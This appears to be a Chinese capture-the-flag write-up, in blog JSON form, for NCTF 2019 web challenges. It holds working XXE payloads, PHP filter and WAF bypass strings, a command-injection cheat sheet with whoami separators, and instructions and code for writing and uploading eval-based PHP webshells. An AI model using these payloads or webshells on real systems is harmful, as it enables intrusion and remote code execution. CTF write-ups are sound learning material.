{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>简单的xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>常用的内网IP文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>解密：</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>照着Ip访问，吐槽我的windows下burp响应全是乱码，搞了半天去kali就没事了。</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr — 查找字符串的首次出现，\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode — 使用一个字符串分割另一个字符串\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>第一层使用 %0a 截断绕过，第二层md5绕过<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> 前面几条0e开头的字符串去解密发现都收费，所以我们使用 <code>s878926199a</code> ,加密完解密得 <code>2120624</code> ，我们可以用数字绕过第一个判断，第三层 使用 <code>.</code> 绕过 <code>_</code> ，<code>%20</code> 替代空格，使用<code>l${x}s</code> 列目录，<code>tac%20f*</code> 读 <code>flag</code> .</p>\n<p>看一个 <code>strstr()</code> 的例子</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // 打印 @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // 从 PHP 5.3.0 起\necho $user.&quot;\\r\\n&quot;; // 打印 name\nvar_dump(&quot;01&quot;==true);\n\n输出：\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions — 返回所有已定义函数的数组\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //压入栈底\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,不能输入这些函数哦 :) &quot;);\n    }\n}</code></pre><p>测试一下$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    }\n}\n?&gt;</code></pre><p>使用命令拼接绕过 waf()</p>\n<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>令执行利用及绕过姿势　　</p>\n<p>写入webshell:</p>\n<p>利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义，假设需要写入<?php eval($_POST[kang]); ?>，方法如下：<br>WINDOWS：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web可写目录加文件完整名字</p>\n<p>linux下需要用\\来转义&lt;，不过很多php都默认开启gpc（魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web可写目录加文件完整名字</p>\n<p>| 命令管道符</p>\n<p>&lt;&gt;&gt;&gt; 文件重定向符</p>\n<p>测试： 0 | dir c:</p>\n<p>　　代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</p>\n<p>windows支持：</p>\n<p>|     直接执行后面的语句      ping 127.0.0.1|whoami          </p>\n<p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p>\n<p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linux支持(比上面多一个):</p>\n<p>;     前面的执行完执行后面的      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>打开题目在头像那里得 image 找到上传点，先上传</p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>提示 <code>&lt;?</code> ，然后直接拿上次 SUCTF 用剩下得马</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>然后再修改 content-type ，传完得到图片路径，但是不能直接访问，观察到链接为 </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>于是访问</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>即可</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>文字替换工具，hint：<code>使用php5.6+bootstrap进行开发</code> ，猜测 <code>preg_replace</code> 的 <code>/e</code> 代码执行。</p>\n<p>第三个框内的内容应该就是 /e的部分，我们输入 <code>var_dump(111)</code> ，成功打印 <code>int(111)</code> ，输入单引号双引号都会被过滤，可以利用 chr() 来绕过。</p>\n<p>我们输入scandir(chr(47)) 发现列不了目录。直接读文件 </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]}